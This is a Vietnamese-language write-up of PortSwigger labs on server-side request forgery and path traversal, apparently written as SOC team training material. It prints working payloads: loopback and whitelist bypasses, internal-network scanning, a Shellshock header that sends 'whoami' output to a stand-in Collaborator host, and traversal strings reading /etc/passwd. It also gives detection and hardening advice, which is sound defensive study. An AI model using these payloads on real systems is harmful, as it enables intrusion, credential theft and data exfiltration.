---
id: ssrf-path-traversal-labs
title: SSRF & Path Traversal — Labs PortSwigger
sidebar_label: SSRF & Path Traversal (Week 12)
sidebar_position: 5
description: Writeup 7 lab SSRF và 6 lab Path Traversal trên PortSwigger — từ Basic SSRF đến Blind SSRF với Shellshock, Filter bypass kỹ thuật nâng cao. OWASP A10/A01.
---

# SSRF & Path Traversal — Labs PortSwigger

> **Week 12 · OWASP A10 (SSRF) & A01 (Broken Access Control — Path Traversal)**  
> Tổng hợp writeup 13 lab thực chiến trên PortSwigger Web Security Academy, bao gồm phân tích kỹ thuật chuyên sâu, payload mẫu, và bài học phòng thủ dành cho SOC Analyst tại VNCS Global.

---

## Phần A — Server-Side Request Forgery (SSRF) · 7 Labs

### Lý thuyết nền tảng

Server-Side Request Forgery (SSRF) là lớp lỗ hổng cho phép kẻ tấn công khiến máy chủ web gửi HTTP request tuỳ ý đến một đích đến do attacker kiểm soát — có thể là tài nguyên nội bộ (internal network), hoặc dịch vụ bên ngoài (external OOB). Điều khiến SSRF trở thành một trong những lỗ hổng nguy hiểm nhất trong môi trường cloud hiện đại nằm ở chỗ: khi một server bị SSRF, attacker có thể gọi thẳng vào **cloud metadata endpoint** như `http://169.254.169.254/latest/meta-data/iam/security-credentials/` của AWS, từ đó thu hoạch IAM credential tạm thời (Access Key + Secret Key + Session Token) với đặc quyền của EC2 role đang chạy ứng dụng. Credential tạm thời này đủ để pivot sang S3, RDS, Lambda, hoặc bất kỳ dịch vụ AWS nào mà role đó được phép truy cập.

SSRF tồn tại ở hai dạng chính. **Basic SSRF** (hay Reflected SSRF) là khi phản hồi từ request nội bộ được trả nguyên xi về cho attacker trong HTTP response — attacker thấy trực tiếp nội dung của tài nguyên nội bộ. **Blind SSRF** là khi server thực sự gửi request đến đích (có thể xác nhận qua DNS lookup hoặc HTTP callback đến Burp Collaborator), nhưng attacker không nhận được nội dung response trong band — buộc phải dùng kỹ thuật Out-of-Band (OOB) để chứng minh và khai thác.

Cơ chế bypass filter trong SSRF rất phong phú. Với **blacklist-based filter** (chặn chuỗi "localhost", "127.0.0.1"): attacker có thể biểu diễn cùng địa chỉ IP bằng các hình thức khác như decimal (`2130706433`), hex (`0x7f000001`), octal (`0177.0.0.1`), hoặc rút gọn (`127.1`). Với **whitelist-based filter** (chỉ cho phép domain cụ thể): có thể khai thác cú pháp URL với `user@host` format — bộ validator kiểm tra domain trong phần host nhưng HTTP client lại kết nối đến phần userinfo trước dấu `@`. Một kỹ thuật khác là lợi dụng **open redirect** trên chính domain được whitelist để bounce request sang đích tùy ý, đặc biệt hiệu quả khi filter được implement chặt nhưng ứng dụng có endpoint redirect không an toàn.

---

### Lab 1 — Basic SSRF against the local server

**Logic:** Ứng dụng có chức năng kiểm tra tồn kho sản phẩm, gửi tham số `stockApi` chứa URL đến backend. Tham số này không bị validate hay giới hạn, nên server sẽ fetch bất kỳ URL nào được cung cấp. Admin panel chỉ accessible từ localhost (kiểm soát bằng network-level ACL phía server, không phải authentication), nên SSRF từ chính server đó sẽ bypass kiểm soát này.

**Payload:**
```
POST /product/stock HTTP/1.1
...

stockApi=http://localhost/admin
```

Sau khi đọc được admin panel, gọi tiếp endpoint xóa user:
```
stockApi=http://localhost/admin/delete?username=carlos
```

**Takeaway:** Đây là dạng SSRF cơ bản nhất — không cần bypass filter. Nguy hiểm vì attacker tận dụng trust relationship giữa localhost với các dịch vụ nội bộ. Trong môi trường thực tế, pattern tương tự có thể được dùng để gọi metadata AWS, internal API, hoặc các service không có authentication vì vốn chỉ được truy cập từ mạng nội bộ.

---

### Lab 2 — Basic SSRF against another back-end system

**Logic:** Admin panel không nằm trên localhost mà trên một IP nội bộ trong dải `192.168.0.0/24`, cổng `8080`. Server vẫn fetch URL trong `stockApi` không hạn chế. Vấn đề là attacker không biết IP chính xác của backend admin, cần enumerate.

**Payload — Burp Intruder:**
```
stockApi=http://192.168.0.§1§:8080/admin
```

Dùng Intruder với payload type **Numbers**, từ 1 đến 255, step 1. IP nào trả về HTTP 200 thay vì timeout/connection refused là IP của admin panel. Sau khi tìm được (ví dụ `192.168.0.34`):
```
stockApi=http://192.168.0.34:8080/admin/delete?username=carlos
```

**Takeaway:** Trong môi trường microservices, các internal service thường không có authentication vì giả định chỉ accessible trong mạng nội bộ. SSRF phá vỡ giả định này hoàn toàn — server trở thành proxy cho attacker scan và tương tác với toàn bộ internal network.

---

### Lab 3 — SSRF with blacklist-based input filter

**Logic:** Ứng dụng implement blacklist đơn giản: chặn các chuỗi "localhost" và "127.0.0.1" theo dạng string matching. Tuy nhiên, có nhiều cách biểu diễn địa chỉ loopback mà filter không phủ hết. Đồng thời, path `/admin` cũng bị chặn, cần bypass cả phần path.

**Bypass địa chỉ IP:**
```
http://127.1/             ← viết tắt hợp lệ của 127.0.0.1
http://2130706433/        ← decimal representation
http://0177.0.0.1/        ← octal
http://[::1]/             ← IPv6 loopback
```

**Bypass path `/admin` bằng double URL-encode:**
```
/admin   →   /%61dmin   →   /%2561dmin
```

Server decode `%25` thành `%`, sau đó decode lần hai ra `a`, cuối cùng path là `/admin`.

**Payload kết hợp:**
```
stockApi=http://127.1/%2561dmin
```

**Takeaway:** Blacklist string-matching là cách tiếp cận yếu vì không gian biểu diễn IP rất rộng. Filter tốt phải parse và normalize URL về canonical form trước khi validate, không nên match raw string.

---

### Lab 4 — SSRF with whitelist-based input filter

**Logic:** Ứng dụng enforce whitelist nghiêm ngặt hơn: URL phải chứa domain `stock.weliketoshop.net`. Tuy nhiên, URL parser của validator và HTTP client xử lý URL không nhất quán — đây là lỗ hổng cơ bản trong cách các thư viện parse URL.

**Khai thác userinfo trong URL:**

RFC 3986 định nghĩa URL format: `scheme://[userinfo@]host[:port]/path`. Phần `userinfo` (trước `@`) được dùng để truyền credentials (dạng `user:password@host`). Khi attacker gửi:
```
http://localhost@stock.weliketoshop.net/admin
```
Một số validator kiểm tra phần `host` và thấy `stock.weliketoshop.net` — hợp lệ. Nhưng một số HTTP client lại interpret `localhost` là host thực sự và `stock.weliketoshop.net` là userinfo, dẫn đến request đến `localhost`.

**Khai thác fragment (nếu server parse sai):**
```
http://stock.weliketoshop.net#@localhost/admin
```

Phần sau `#` theo chuẩn là fragment, không gửi đến server — nhưng nếu HTTP client xử lý sai, nó có thể kết nối đến `localhost`.

**Payload thực tế:**
```
stockApi=http://localhost%23@stock.weliketoshop.net/admin
```

URL-encode `#` thành `%23` để bypass một số filter trước khi server decode và interpret.

**Takeaway:** Whitelist tốt hơn blacklist nhưng vẫn có thể bị bypass do ambiguity trong URL parsing. Defense phải dùng allowlist kết hợp với chính sách egress firewall ở network layer, không chỉ ở application layer.

---

### Lab 5 — SSRF via open redirect

**Logic:** Whitelist được implement đúng cách — không thể bypass bằng URL tricks. Tuy nhiên, ứng dụng có một endpoint hợp lệ trong whitelist là `/product/nextProduct?path=...` thực hiện server-side redirect đến URL trong tham số `path` mà không validate. Server follow redirect này, dẫn đến SSRF thông qua chuỗi: request hợp lệ → redirect → internal URL.

**Payload:**
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Khi server nhận request này, nó fetch `/product/nextProduct?path=...` — URL hợp lệ theo whitelist. Server nhận response 302 redirect đến `http://192.168.0.12:8080/admin` và follow redirect đó, gửi request đến IP nội bộ.

**Takeaway:** Open redirect trở thành SSRF gadget khi server follow redirect phía server-side. Kiểm tra open redirect không chỉ là vấn đề phishing — trong ngữ cảnh SSRF, nó có thể bypass whitelist hoàn toàn. Đây là ví dụ điển hình của **chained vulnerability**.

---

### Lab 6 — Blind SSRF with out-of-band detection

**Logic:** Ứng dụng có SSRF trong header `Referer` — server log hoặc xử lý URL trong Referer và gửi request đến đó, nhưng response không bao giờ được trả về cho attacker trong HTTP response. Đây là Blind SSRF điển hình. Cách duy nhất để detect là dùng OOB channel.

**Payload:**
```
Referer: https://YOUR-COLLABORATOR-ID.oastify.com
```

Sử dụng Burp Collaborator (Professional) hoặc interactsh (open-source). Sau khi gửi request, kiểm tra Collaborator nhận được DNS lookup và/hoặc HTTP request từ IP của server mục tiêu.

**Ý nghĩa của OOB detection:** Dù không đọc được dữ liệu nội bộ, việc chứng minh server gửi request đến attacker-controlled endpoint là đủ để xác nhận SSRF tồn tại. Từ đó, attacker có thể thiết kế payload phức tạp hơn (như Lab 7) để exfiltrate data qua DNS.

**Takeaway:** Blind SSRF khó detect hơn từ phía Blue Team vì không có dấu hiệu rõ ràng trong response. SOC cần monitor outbound DNS và HTTP từ web server đến các domain không thuộc whitelist.

---

### Lab 7 — Blind SSRF with Shellshock exploitation

**Logic:** Lab này kết hợp hai lỗ hổng nghiêm trọng: Blind SSRF và Shellshock (CVE-2014-6271). Server nội bộ (`192.168.0.X`) chạy một bash script xử lý các HTTP request và vulnerable với Shellshock — lỗ hổng trong bash cho phép thực thi lệnh tùy ý thông qua environment variable được inject vào function definition. User-Agent header của HTTP request được pass vào environment variable, sau đó bash eval nó.

**Bước 1 — Tìm IP internal server:**

Dùng Intruder với payload trong `stockApi` để enumerate `192.168.0.1-255:8080`, kết hợp Collaborator để detect response OOB.

**Bước 2 — Inject Shellshock payload qua User-Agent:**
```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR-ID.oastify.com
```

**Giải thích Shellshock payload:**
- `() { :; };` — định nghĩa một bash function rỗng
- Phần sau `;` là lệnh sẽ được thực thi khi bash parse function definition
- `$(whoami)` — command substitution, chèn output của `whoami` vào subdomain của Collaborator
- `nslookup` — gửi DNS query, tạo OOB interaction

**Payload kết hợp:**
```
POST /product/stock HTTP/1.1
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLAB.oastify.com

stockApi=http://192.168.0.34:8080/
```

Khi SSRF khiến server fetch URL của internal server, internal server process request với User-Agent chứa Shellshock payload, thực thi lệnh, gửi DNS query đến Collaborator với username embedded trong subdomain.

**Takeaway:** Đây là ví dụ thực tế về **exploit chain**: SSRF (điểm vào) → Internal network reach → Shellshock (RCE trên internal server) → OOB exfiltration. Trong pentest và red team, SSRF thường là bước đầu của một chuỗi khai thác dài hơn, không chỉ là đọc file.

---

### Bài học Red Team / Blue Team — SSRF

Từ góc nhìn **Red Team**, SSRF là một trong những vector tấn công có ROI cao nhất trong môi trường cloud: một lỗ hổng SSRF đơn lẻ trong ứng dụng web đủ để pivot sang toàn bộ hạ tầng AWS/GCP/Azure thông qua metadata service. Các endpoint cần test: tham số URL trong API (`webhookUrl`, `fetchUrl`, `stockApi`, `callback`, `redirect`), header `Referer`, `X-Forwarded-For`, bất kỳ chức năng nào cho phép server fetch external resource (preview URL, import from URL, PDF generator, health check).

Từ góc nhìn **Blue Team / SOC**, tín hiệu cần monitor bao gồm: outbound HTTP/HTTPS request từ web server đến dải RFC1918 (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`), outbound request đến `169.254.169.254` (cloud metadata), outbound DNS query với pattern bất thường (subdomain dài, có vẻ như chứa data encode), web server log có `stockApi` hoặc tham số tương tự chứa `localhost`, `127.`, `192.168.`, `169.254.`. WAF signature cho SSRF nên normalize URL trước khi match pattern, không dùng simple string matching. Ngoài ra, triển khai **egress filtering** tại network layer — web server không nên được phép gửi outbound connection đến arbitrary IP; chỉ whitelist các destination cần thiết.

---

## Phần B — Path Traversal (Directory Traversal) · 6 Labs

### Lý thuyết nền tảng

Path Traversal, còn gọi là Directory Traversal, là lớp lỗ hổng cho phép attacker đọc (và đôi khi ghi) file tùy ý trên server bằng cách thao túng tham số chứa đường dẫn file. Cơ chế cốt lõi là chuỗi `../` (Unix) hoặc `..\` (Windows) — mỗi `../` di chuyển lên một cấp thư mục trong cây filesystem. Nếu ứng dụng nối trực tiếp tham số người dùng vào base path mà không validate hoặc normalize, attacker có thể thoát khỏi thư mục dự kiến và đi đến bất kỳ nơi nào trong filesystem.

Mục tiêu điển hình trên Linux/Unix: `/etc/passwd` (danh sách user), `/etc/shadow` (password hash — cần root), `/etc/hosts`, `/proc/self/environ` (environment variable, có thể chứa secret), private key `~/.ssh/id_rsa`, source code ứng dụng, config file chứa database credential. Trên Windows: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`, `C:\Windows\System32\drivers\etc\hosts`.

Filter bypass là chủ đề trung tâm của các labs nâng cao. Các kỹ thuật chính gồm: dùng **absolute path** trực tiếp (`/etc/passwd`) nếu filter chỉ chặn traversal sequence; **non-recursive strip bypass** bằng cách nhúng traversal sequence lồng nhau (`....//` hay `..././`) để sau khi strip một lần vẫn còn `../`; **URL encoding** (`%2e%2e%2f`) với hy vọng filter check trước khi decode, server decode sau; **double URL encoding** (`%252e%252e%252f`) vượt qua filter decode một lần; **null byte** (`%00`) để terminate chuỗi sớm khi ứng dụng C-level, bypass filter kiểm tra extension; và kết hợp traversal với **base path prefix** khi filter yêu cầu path bắt đầu bằng thư mục cụ thể.

---

### Lab 1 — File path traversal, simple case

**Logic:** Ứng dụng tải ảnh sản phẩm qua parameter `filename` trong URL: `/image?filename=product1.png`. Server đọc file từ thư mục `/var/www/images/` và nối thẳng với giá trị của `filename` mà không có bất kỳ validation hay sanitization nào.

**Payload:**
```
GET /image?filename=../../../etc/passwd HTTP/1.1
```

Server thực thi: `open("/var/www/images/../../../etc/passwd")` — path được OS normalize thành `/etc/passwd`, trả về nội dung file.

**Takeaway:** Đây là case đơn giản nhất — không có filter. Trong thực tế, nhiều ứng dụng legacy hoặc ứng dụng được phát triển nhanh vẫn mắc lỗi này. Kiểm tra bằng cách thêm `../` vào bất kỳ tham số nào liên quan đến file, đặc biệt là image, document, template.

---

### Lab 2 — Path traversal, traversal sequences blocked with absolute path bypass

**Logic:** Ứng dụng đã có filter loại bỏ traversal sequence `../` khỏi input. Tuy nhiên, filter không chặn absolute path — developer giả định rằng chỉ cần chặn relative traversal là đủ, không nghĩ đến việc user cung cấp absolute path.

**Payload:**
```
GET /image?filename=/etc/passwd HTTP/1.1
```

Server nối `/var/www/images/` với `/etc/passwd` nhưng do `/etc/passwd` bắt đầu bằng `/`, OS interpret đây là absolute path và đọc thẳng `/etc/passwd`, bỏ qua base directory.

**Takeaway:** Filter path traversal phải xử lý cả hai trường hợp: relative traversal (`../`) và absolute path injection (`/etc/`). Cách đúng là dùng `realpath()` (PHP) hoặc `os.path.realpath()` (Python) để resolve path, sau đó kiểm tra path đã resolve có nằm trong base directory không.

---

### Lab 3 — Path traversal, traversal sequences stripped non-recursively

**Logic:** Filter detect và xóa chuỗi `../` nhưng chỉ xóa một lần (non-recursive), không lặp lại cho đến khi không còn traversal sequence. Bằng cách nhúng traversal sequence lồng nhau, sau khi filter xóa `../` ở giữa, chuỗi còn lại vẫn tạo thành `../` mới.

**Payload:**
```
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```

**Giải thích:**
```
....//   →  filter xóa ../  →  ../
```

Cụ thể: `....//` = `..` + `../` + `/`. Filter tìm và xóa `../` xuất hiện ở giữa, còn lại `../`. Tương đương:
```
..././  →  filter xóa ../  →  ../
```

**Takeaway:** Filter phải được implement theo kiểu **whitelist** (chỉ cho phép ký tự và pattern hợp lệ) hoặc normalize path trước khi validate, không nên xóa blacklisted sequence vì luôn có cách nhúng để bypass strip đơn lần.

---

### Lab 4 — Path traversal with superfluous URL-decode

**Logic:** Filter decode URL một lần, kiểm tra, rồi từ chối nếu thấy traversal sequence. Nhưng server lại decode URL một lần nữa khi xử lý request thực tế. Attacker encode traversal sequence hai lần — sau lần decode đầu (bởi filter) vẫn là ký tự encode, chỉ sau lần decode thứ hai (bởi server) mới ra traversal sequence thực.

**Payload — single URL encode:**
```
%2e%2e%2f  →  decode 1 lần  →  ../  ← bị filter chặn
```

**Payload — double URL encode:**
```
%252e%252e%252f
  → decode lần 1 →  %2e%2e%2f  ← filter thấy, không phải ../  → pass
  → decode lần 2 →  ../         ← server dùng path này
```

```
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
```

**Takeaway:** Double-decode vulnerability (hay "double encoding attack") xảy ra khi request đi qua nhiều lớp decode (WAF decode, middleware decode, application decode). Filter phải normalize URL đến dạng canonical (fully decoded) trước khi validate.

---

### Lab 5 — Path traversal with validation of start of path

**Logic:** Filter yêu cầu tham số `filename` phải bắt đầu bằng base path `/var/www/images/` — developer nghĩ rằng chỉ cần bắt đầu đúng thư mục là an toàn. Tuy nhiên, sau phần prefix hợp lệ, attacker có thể thêm traversal sequence để thoát ra ngoài.

**Payload:**
```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

Filter kiểm tra: `startsWith("/var/www/images/")` → true → pass. Server resolve path: `/var/www/images/../../../etc/passwd` → `/etc/passwd`.

**Takeaway:** Kiểm tra prefix không đủ. Sau khi kiểm tra prefix, phải resolve path về canonical form và kiểm tra path đã resolve vẫn còn nằm trong base directory:
```python
import os
base = "/var/www/images/"
user_input = "/var/www/images/../../../etc/passwd"
resolved = os.path.realpath(user_input)
if not resolved.startswith(os.path.realpath(base)):
    raise Exception("Path traversal detected")
```

---

### Lab 6 — Path traversal with file extension validation via null byte bypass

**Logic:** Filter yêu cầu `filename` phải kết thúc bằng extension `.png`. Tuy nhiên, ứng dụng được implement bằng ngôn ngữ có C-extension hoặc gọi system call C-level để mở file. Trong C, string được terminate bởi null byte `\0`. Null byte `%00` khi inject vào filename khiến C runtime đọc string đến null byte, bỏ qua phần còn lại (`.png`).

**Payload:**
```
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
```

Filter thấy filename kết thúc bằng `.png` → pass. C runtime (hoặc PHP cũ sử dụng C string) đọc: `../../../etc/passwd\0.png` → `../../../etc/passwd` (stop tại null byte) → mở `/etc/passwd`.

**Lưu ý:** Null byte bypass hoạt động với PHP < 5.3.4 và một số ngôn ngữ/framework khác. PHP hiện đại (≥ 5.3.4) đã fix. Vẫn có thể gặp trong legacy system hoặc ứng dụng gọi C library trực tiếp.

**Takeaway:** Validate extension bằng whitelist là tốt, nhưng phải thực hiện sau khi đã normalize và sanitize path (bao gồm reject null byte). Input validation phải reject bất kỳ ký tự null nào trong filename parameter.

---

### Bài học Red Team / Blue Team — Path Traversal

Từ góc nhìn **Red Team**, path traversal là kỹ thuật nền tảng để leo thang đặc quyền theo chiều ngang (đọc file của user khác) và thu thập thông tin nhạy cảm (credential, private key, source code). Trong black-box testing, tất cả tham số liên quan đến file — `filename`, `path`, `file`, `template`, `page`, `include`, `load`, `view`, `doc`, `asset` — đều cần được test với traversal sequence. Đặc biệt chú ý các tính năng: hiển thị ảnh/tài liệu, download file, template rendering, log viewer trong admin panel.

Từ góc nhìn **Blue Team / SOC**, signature detection cho path traversal gồm: tham số chứa `../`, `%2e%2e`, `....//`, `%252e`, absolute path `/etc/`, `/windows/`, `win.ini` trong request log. WAF rule cần normalize URL (decode) trước khi match pattern để tránh bypass qua encoding. Ở tầng server, áp dụng **chroot jail** hoặc **container** để giới hạn filesystem access của process web server — ngay cả khi path traversal thành công, attacker chỉ thấy filesystem trong jail. Sử dụng `realpath()` validation trong code và thiết lập file permission nghiêm ngặt: web server process không cần đọc `/etc/shadow`, `/root/`, hay private key.

---

## Tổng kết: Đối chiếu OWASP Top 10 & Khuyến nghị cho SOC

SSRF hiện được xếp riêng tại **OWASP A10:2021 — Server-Side Request Forgery**, phản ánh mức độ nguy hiểm ngày càng tăng trong kiến trúc microservices và cloud-native. Trước đó, SSRF thường bị xếp nhóm với injection hoặc không được đề cập; sự xuất hiện riêng biệt trong OWASP 2021 là thừa nhận rằng đây là attack surface riêng biệt cần được model threat và test độc lập. Xu hướng **A10 → A07** (Security Misconfiguration) cũng liên quan: nhiều SSRF exploits thành công không phải do logic của ứng dụng mà do misconfiguration — cloud metadata endpoint không bị chặn, internal service không có authentication, egress không được filter.

Path Traversal thuộc **OWASP A01:2021 — Broken Access Control**, danh mục rộng nhất bao gồm mọi form kiểm soát truy cập bị vi phạm, không chỉ ở tầng API hay web endpoint mà còn ở tầng filesystem. Access control phải được implement ở nhiều tầng: authentication/authorization tầng ứng dụng, filesystem permission tầng OS, và containment (chroot/container) tầng infrastructure. Path traversal là minh chứng rõ ràng nhất cho nguyên tắc **Defense in Depth**: nếu input validation bị bypass, filesystem permission vẫn là lớp bảo vệ cuối cùng.

Bài học cross-cutting quan trọng nhất từ cả hai loại lỗ hổng này là **không tin tưởng input của người dùng trong bất kỳ context nào** — dù là URL (SSRF), file path (Path Traversal), hay bất kỳ tham số nào khác. Kiến trúc phòng thủ tốt phải bao gồm: validate và normalize input ở application layer, enforce policy ở network layer (egress filtering, internal network segmentation), và giới hạn đặc quyền ở OS layer (least privilege, chroot, container). Đối với SOC tại VNCS Global, **egress monitoring** là ưu tiên hàng đầu: web server không bao giờ nên khởi tạo outbound connection đến IP nội bộ của chính mình hay đến cloud metadata endpoint — bất kỳ traffic nào như vậy trong log đều là Indicator of Compromise (IoC) cần điều tra ngay lập tức.

---

*Tài liệu được biên soạn bởi team SOC Analyst — VNCS Global | PortSwigger Web Security Academy Week 12 | OWASP Top 10 2021*
